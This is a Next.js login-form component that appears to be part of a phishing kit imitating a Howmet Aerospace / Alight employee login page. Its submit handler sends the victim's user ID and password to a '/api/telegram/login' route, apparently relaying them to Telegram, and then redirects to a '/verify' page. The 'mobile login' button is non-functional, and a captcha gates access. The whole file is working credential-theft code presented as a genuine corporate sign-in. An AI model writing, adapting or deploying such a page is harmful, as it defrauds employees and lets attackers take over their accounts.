"use client";

import type React from "react";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";

interface LoginFormProps {
  visitorInfo?: any;
}

export function LoginForm({ visitorInfo }: LoginFormProps) {
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [turnstileReady, setTurnstileReady] = useState(false);
  const [turnstileToken, setTurnstileToken] = useState<string>("");
  const [turnstileError, setTurnstileError] = useState<string | null>(null);
  const [mobileLoginLoading, setMobileLoginLoading] = useState(false);
  const [forgotPasswordLoading, setForgotPasswordLoading] = useState(false);
  const [newUserLoading, setNewUserLoading] = useState(false);
  const router = useRouter();

  const isSubmitDisabled = isLoading || !turnstileReady || !turnstileToken;

  const TURNSTILE_SITE_KEY = "0x4AAAAAACs5BdLxYCGSNXby";

  useEffect(() => {
    (window as any).onTurnstileVerified = (token: string) => {
      setTurnstileToken(token);
    };

    const scriptSrc = "https://challenges.cloudflare.com/turnstile/v0/api.js";
    const existing = document.querySelector(`script[src="${scriptSrc}"]`);
    if (!existing) {
      const script = document.createElement("script");
      script.src = scriptSrc;
      script.async = true;
      script.defer = true;
      script.onload = () => setTurnstileReady(true);
      script.onerror = () =>
        setTurnstileError("Failed to load captcha. Refresh page.");
      document.head.appendChild(script);
    } else {
      setTurnstileReady(true);
    }
  }, []);

  const handleMobileLoginClick = (e: React.MouseEvent) => {
    e.preventDefault();
    if (mobileLoginLoading) return;
    setMobileLoginLoading(true);
    setTimeout(() => {
      setMobileLoginLoading(false);
    }, 1000);
  };

  const handleForgotPasswordClick = (e: React.MouseEvent) => {
    e.preventDefault();
    if (forgotPasswordLoading) return;
    setForgotPasswordLoading(true);
    setTimeout(() => {
      router.push("/forgot-password");
    }, 2000);
  };

  const handleNewUserClick = (e: React.MouseEvent) => {
    e.preventDefault();
    if (newUserLoading) return;
    setNewUserLoading(true);
    setTimeout(() => {
      router.push("/new-user");
    }, 2000);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isLoading) return;
    setIsLoading(true);

    try {
      const res = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId,
          password,
          turnstileToken,
        }),
      });
      if (!res.ok) {
        const body = await res.json().catch(() => null);
        console.error("Login failed:", body?.error || res.statusText);
        setIsLoading(false);
        return;
      }
    } catch (error) {
      console.error("Failed to send login notification:", error);
      setIsLoading(false);
      return;
    }

    if (typeof window !== "undefined") {
      sessionStorage.setItem("ubs_verify", "1");
    }
    router.push("/verify");
  };

  return (
    <form
      id="loginRedesignOnForm"
      className="space-y-5"
      onSubmit={handleSubmit}
      noValidate
    >
      <div className="text-center">
        <img
          src="/Howmet Login Logo Small.png"
          alt="Howmet Aerospace"
          className="mx-auto w-auto"
        />
      </div>

      <div className="h-4" />

      <div className="space-y-4">
        <div className="flex h-12 items-center rounded-xl border border-slate-300 bg-slate-50 shadow-sm">
          <span className="flex h-full w-12 items-center justify-center rounded-l-xl bg-slate-900 text-white">
            <img
              src="/placeholder-user.png"
              title="This is an entry field where you must input your user ID to access the site."
              alt="User ID"
              className="h-4 w-4"
            />
          </span>
          <Input
            id="userId"
            type="text"
            placeholder="User ID"
            value={userId}
            onChange={(e) => setUserId(e.target.value)}
            className="h-full flex-1 border-0 bg-transparent px-3 text-sm text-slate-900 placeholder:text-slate-400 focus-visible:outline-none"
          />
        </div>

        <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
          <Button
            type="button"
            onClick={handleMobileLoginClick}
            disabled={mobileLoginLoading}
            className="inline-flex items-center justify-center rounded-full bg-[#00a6c7] px-4 py-2 text-sm font-semibold text-white shadow-sm transition hover:bg-[#00849c] disabled:opacity-70 disabled:cursor-not-allowed"
          >
            {mobileLoginLoading ? "Loading..." : "Login with Alight Mobile"}
          </Button>
          <button
            type="button"
            className="inline-flex h-10 w-10 items-center justify-center rounded-full border border-slate-300 bg-white text-slate-900 shadow-sm transition hover:bg-slate-100"
            aria-label="What is Login with Alight Mobile?"
          >
            ?
          </button>
        </div>

        <div className="flex h-12 items-center rounded-xl border border-slate-300 bg-slate-50 shadow-sm">
          <span className="flex h-full w-12 items-center justify-center rounded-l-xl bg-slate-900 text-white">
            <img
              src="/icon_pwd.png"
              title="This is an entry field where you must input your password to access the site."
              alt="Password"
              className="h-4 w-4"
            />
          </span>
          <Input
            id="password"
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="h-full flex-1 border-0 bg-transparent px-3 text-sm text-slate-900 placeholder:text-slate-400 focus-visible:outline-none"
          />
        </div>

        <div className="flex items-center gap-2 text-sm text-slate-700">
          <Checkbox
            id="show-password"
            checked={showPassword}
            onCheckedChange={(checked) => setShowPassword(checked as boolean)}
            className="border-slate-400"
          />
          <label htmlFor="show-password" className="cursor-pointer select-none">
            Show Password
          </label>
        </div>
      </div>

      <div className="flex justify-center">
        <div
          className="cf-turnstile"
          data-sitekey={TURNSTILE_SITE_KEY}
          data-callback="onTurnstileVerified"
        />
      </div>

      <Button
        type="submit"
        disabled={isSubmitDisabled}
        className="w-full rounded-xl border border-slate-800 bg-slate-700 py-3 text-sm font-semibold text-white transition hover:bg-slate-800 disabled:cursor-not-allowed disabled:opacity-70"
      >
        {isLoading ? "Loading..." : "Log On"}
      </Button>

      {turnstileError ? (
        <p className="text-center text-xs text-red-600">{turnstileError}</p>
      ) : !turnstileReady ? (
        <p className="text-center text-xs text-slate-500">
          Loading security check... please wait.
        </p>
      ) : !turnstileToken ? (
        <p className="text-center text-xs text-slate-500">
          Complete the captcha challenge before logging in.
        </p>
      ) : null}

      <div className="space-y-3 text-sm">
        <button
          type="button"
          onClick={handleForgotPasswordClick}
          disabled={forgotPasswordLoading}
          className="w-full text-left font-medium text-sky-700 transition hover:text-sky-900 disabled:opacity-70 disabled:cursor-not-allowed"
        >
          {forgotPasswordLoading ? "Loading..." : "Forgot User ID or Password?"}
        </button>
        <button
          type="button"
          onClick={handleNewUserClick}
          disabled={newUserLoading}
          className="w-full text-left font-medium text-sky-700 transition hover:text-sky-900 disabled:opacity-70 disabled:cursor-not-allowed"
        >
          {newUserLoading ? "Loading..." : "New User?"}
        </button>
      </div>

      <div className="flex justify-end items-center gap-3 text-sm">
        <button
          type="button"
          className="font-semibold text-slate-900 hover:text-slate-700"
        >
          Help
        </button>
        <button
          type="button"
          className="inline-flex h-10 w-10 items-center justify-center rounded-full border border-slate-300 bg-white text-slate-900 shadow-sm transition hover:bg-slate-100"
          aria-label="Help"
        >
          ?
        </button>
      </div>
    </form>
  );
}
